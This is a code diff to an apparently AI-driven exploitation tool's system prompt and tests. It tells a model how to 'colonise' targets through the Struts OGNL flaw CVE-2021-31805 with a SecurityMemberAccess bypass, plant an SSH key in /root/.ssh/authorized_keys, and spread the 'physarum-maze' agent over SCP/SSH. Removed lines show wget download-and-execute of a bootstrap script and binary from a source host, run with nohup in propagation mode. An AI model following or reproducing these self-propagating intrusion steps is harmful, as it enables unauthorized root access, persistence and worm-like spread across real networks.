@@ -138,35 +138,27 @@ for each element. freemarker.Execute and similar evaluators have the same constr
 
 OGNL COMMANDS ARRAY — construct based on delivery path:
 
-SSH-FIRST PATH (when port 22 is open on target — preferred):
-  commands[0]: \"wget -q http://<source_ip>:8001/bootstrap.sh -O /tmp/bootstrap.sh\"
-  commands[1]: \"sh /tmp/bootstrap.sh\"
+SSH-FIRST PATH (when port 22 is open on target — ONLY supported path):
+  commands[0]: \"mkdir -p /root/.ssh\"
+  commands[1]: \"mkdir -p /tmp/physarum\"
+  commands[2]: \"WRITE_PUBKEY\"
+  commands[3]: \"chmod 600 /root/.ssh/authorized_keys\"
   Then: ScpUpload → SshCommand (same as other CVE classes)
 
-wget-ONLY PATH (when port 22 is NOT open):
-  commands[0]: \"mkdir -p /tmp/physarum\"
-  commands[1]: \"wget -q http://<source_ip>:8001/physarum-maze -O /tmp/physarum/physarum-maze\"
-  commands[2]: \"chmod +x /tmp/physarum/physarum-maze\"
-  commands[3]: \"nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &\"
+WRITE_PUBKEY is a sentinel handled by the executor — it writes the ephemeral public key
+directly to /root/.ssh/authorized_keys via Java FileOutputStream OGNL (no HTTP server).
+Never replace WRITE_PUBKEY with wget, curl, or any command that fetches a remote resource.
 
-IMPORTANT: replace <source_ip> with DiscoveryQuery.source_ip. Never hardcode IPs.
-The executor wraps each command in the SecurityMemberAccess bypass OGNL automatically.
+NO-SSH PATH (when port 22 is NOT open on target):
+  OgnlExec cannot colonise this target without SSH for SCP delivery. Use NoPath.
+  Only propose OgnlExec when SSH port 22 is present in the target's port list.
+
+IMPORTANT: The executor wraps each command in the SecurityMemberAccess bypass OGNL automatically.
 Set port to the observed HTTP port (e.g. 8080) — NEVER port 22.
 
 OgnlExec from enrichment result: when enrichment_result is present and the summary
 describes the technique (e.g. \"freemarker.Execute; one command per request\"), use that
 summary to determine the correct command structure and path_prefix for the CVE.
-
-── wget FALLBACK PATH (use only when port 22 is NOT open on target) ─────────────────
-When the target has no SSH (port 22 absent from the ports list) and the CVE class is
-NOT OGNL-based, use a single HttpPost step that downloads and executes the binary:
-  body or path delivers:
-    mkdir -p /tmp/physarum
-    wget -q http://<source_ip>:8001/physarum-maze -O /tmp/physarum/physarum-maze
-    chmod +x /tmp/physarum/physarum-maze
-    nohup /tmp/physarum/physarum-maze --mode propagated >/tmp/physarum/agent.log 2>&1 &
-  Replace <source_ip> with DiscoveryQuery.source_ip.
-  Note: requires port 8001 reachable from target — valid for flat Docker networks.
 
 ── EXPLOIT-DB ENRICHMENT (when available_enrichment_capabilities is non-empty) ────────
 When `available_enrichment_capabilities` contains \"ExploitDb\" and you are uncertain
@@ -376,8 +368,10 @@ For CVE-2015-3306, the method is { "Exploit": { "cve": "CVE-2015-3306" } } — N
         "action": {
           "OgnlExec": {
             "commands": [
-              "wget -q http://<source_ip>:8001/bootstrap.sh -O /tmp/bootstrap.sh",
-              "sh /tmp/bootstrap.sh"
+              "mkdir -p /root/.ssh",
+              "mkdir -p /tmp/physarum",
+              "WRITE_PUBKEY",
+              "chmod 600 /root/.ssh/authorized_keys"
             ],
             "port": 8080,
             "path_prefix": "/"
@@ -416,7 +410,7 @@ For CVE-2015-3306, the method is { "Exploit": { "cve": "CVE-2015-3306" } } — N
     ]
   },
   "confidence": 0.9,
-  "reasoning_summary": "CVE-2021-31805 Struts OGNL confirmed on port 8080; injecting pubkey via OgnlExec (one command per request) then SSH.",
+  "reasoning_summary": "CVE-2021-31805 Struts OGNL confirmed on port 8080; planting pubkey via WRITE_PUBKEY FileOutputStream then SCP/SSH.",
   "preconditions": ["Struts 2.5.x on port 8080", "SSH port 22 open"],
   "validation_check": null,
   "safety_notes": ["freemarker.Execute: one OS command per OGNL request — do not chain with &&"]
@@ -519,12 +513,11 @@ mod tests {
         // OgnlExec replaces __struts_bypass__
         assert!(SYSTEM_PROMPT.contains("OgnlExec"));
         assert!(SYSTEM_PROMPT.contains("one command per request"));
-        assert!(SYSTEM_PROMPT.contains("bootstrap.sh"));
+        // WRITE_PUBKEY sentinel for ephemeral pubkey injection (replaces wget bootstrap)
+        assert!(SYSTEM_PROMPT.contains("WRITE_PUBKEY"));
         assert!(SYSTEM_PROMPT.contains("__self__"));
         assert!(SYSTEM_PROMPT.contains("ScpUpload"));
         assert!(SYSTEM_PROMPT.contains("SshCommand"));
-        // wget fallback when no SSH
-        assert!(SYSTEM_PROMPT.contains("wget FALLBACK"));
         // Enrichment guidance
         assert!(SYSTEM_PROMPT.contains("available_enrichment_capabilities"));
         assert!(SYSTEM_PROMPT.contains("enrichment_request"));
